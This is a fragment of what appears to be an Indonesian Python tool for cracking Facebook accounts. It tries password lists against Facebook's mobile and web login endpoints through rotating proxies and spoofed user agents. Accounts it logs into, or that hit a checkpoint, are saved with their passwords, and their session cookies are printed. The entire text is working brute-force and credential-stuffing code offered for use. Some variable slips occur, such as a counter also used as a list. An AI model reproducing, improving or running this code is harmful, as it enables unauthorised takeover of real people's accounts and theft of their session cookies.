			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https://mbasic.facebook.com/dialog/oauth?response_type=code&client_id=222161937813280&redirect_uri=https://account.xiaomi.com/pass/sns/login/load&state=STATE_248222&scope=email&ret=login&fbapp_pres=0&logger_id=11699442-ce8e-4d69-8952-fb5f6b0c3d12&tp=unspecified&cancel_url=https://account.xiaomi.com/pass/sns/login/load?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=STATE_248222')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/dialog/oauth?response_type=code","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https://m.facebook.com/dialog/oauth?response_type=code&client_id=222161937813280&redirect_uri=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload&state=STATE_248222&scope=email&ret=login&fbapp_pres=0&logger_id=11699442-ce8e-4d69-8952-fb5f6b0c3d12&tp=unspecified&cancel_url=https://account.xiaomi.com/pass/sns/login/load?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=STATE_248222#_=_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'{P}[{M}CP{P}] LOGIN DENGAN CHEKPOINT SEGERA CEK DI {BIRU}mbasic.facebook')
				print(f'\r{x} [{K}=>{P}] ID FACEBOOK  : {K}{idf}')
				print(f'\r{x} [{K}>{P}] PASSWORD  FACEBOOK : {K}{pw}')
				print(f'\r{x} [{K}=>{x}] USER-AGENT BAWWAN SCRIPT : {M}{ua}{M}\n')
				open('CP/'+st_cp,'a').write(idf+'|'+pw)
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				cookies_ganz = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x} [{H}=>{x}] ID FACEBOOK   : {H}{idf}')
				print(f'\r{x} [{H}=>{x}] PASSWORD  FACEBOOK : {H}{pw}')
				print(f'\r{x} [{H}=>{x}] COOKIE FACEBOOK  : {m}{cookies_ganz}{x}')
				print(f'\r{x} [{H}=>{x}] USER-AGENT BAWAN SCRIPT : {M}{ua}{M}\n')
				open('OK/'+st_ok,'a').write(idf+'|'+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#WEB-FB
def crackweb(idf,pwv):
	global loop,ok,cp
	satwa_ran = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r__hack__ {P}%s%s{P}/{MERAH}%s{N} {H}LIVESTRIMNG{P}:{H}%s{P}/{K}CHEKPOINT{N}:{K}%s{P} {MERAJ}%s%s%s{P}'%(satwa_ran,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	ses = requests.Session()
	try:os.mkdir('results')
	except:pass
	for pw in pwk:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			head1 = {
			         "Host": "web.facebook.com",
			         "upgrade-insecure-requests": "1",
			         "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.5107.210 Safari/537.36",
			         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt": "1",
			         "sec-ch-ua":'"Not A;Brand";v="99", "Chromium";v="101"',
			         "cache-control":"max-age=0",
			         "sec-ch-ua-platform": "Android",
			         "sec-fetch-site": "same-origin",
			         "sec-fetch-mode": "navigate",
			         "sec-fetch-user": "?1",
			         "sec-fetch-dest": "document",
			         "referer": "https://web.facebook.com",
			         "accept-encoding": "gzip, deflate",
			         "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
			}
			link = ses.get("https://web.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https://web.facebook.com/dialog/oauth?response_type=code&client_id=222161937813280&redirect_uri=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload&state=STATE_248222&scope=email&ret=login&fbapp_pres=0&logger_id=11699442-ce8e-4d69-8952-fb5f6b0c3d12&tp=unspecified&cancel_url=https://account.xiaomi.com/pass/sns/login/load?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=STATE_248222#_=_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr",headers=head1).text
			date = {"lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(link)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(link)).group(1), "li": re.search('name="li" value="(.*?)"',str(link)).group(1), "try_number": "0", "unrecognized_tries": "0", "uid": idf, "pass": pw}
			head2 = {
			          "Host": "web.facebook.com",
			          "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1),
			          "user-agent": ua,
			          "content-type": "application/x-www-form-urlencoded",
			          "accept": "*/*",
			          "origin": "https://web.facebook.com",
			          "x-requested-with": "com.mi.globalbrowser",
			          "sec-fetch-site": "same-origin",
			          "sec-fetch-mode": "cors",
			          "sec-fetch-dest": "empty",
			          "referer": "https://web.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https://web.facebook.com/dialog/oauth?response_type=code&client_id=222161937813280&redirect_uri=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload&state=STATE_248222&scope=email&ret=login&fbapp_pres=0&logger_id=11699442-ce8e-4d69-8952-fb5f6b0c3d12&tp=unspecified&cancel_url=https://account.xiaomi.com/pass/sns/login/load?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=STATE_248222#_=_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr",
			          "accept-encoding": "gzip, deflate",
			          "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
			}
			bz = ses.post("https://web.facebook.com/login/device-based/regular/login/?api_key=222161937813280&amp;auth_token=d395ae99332eb8a0a4cfa7946823377d&amp;skip_api_login=1&amp;signed_next=1&amp;next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&amp;refsrc=deprecated&amp;app_id=222161937813280&amp;cancel=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&amp;lwv=100&amp;locale2=id_ID&amp;refid=9",data=date,headers=head2, proxies=proxy, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x} [{K}=>{P}] ID FACEBOOK  : {K}{idf}')
				print(f'\r{x} [{K}=>{P}] PASSWORD  : {K}{pw}')
				print(f'\r{x}[{K}=>{x}] USER-AGENT BAWWAN : {M}{ua}{M}\n')
				open('CP/'+st_cp,'a').write(idf+'|'+pw)
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				
				print(f'\r{x} [{H}>{N}] ID FACEBOOK   : {H}{idf}')
				print(f'\r{x} [{H}>{N}] PASSWORD  FACEBOOK  : {H}{pw}')
				print(f'\r{x} [{H}>{N}] COOKIE FACEBOOK     : {m}{kuki}{x}\n')
				wrt = '[LIVE-STRIMING] %s • %s' % (idf,pw)
				ok.append(wrt)
				open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#SUDAHI CRACK MU
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	masuk____cookies_mu()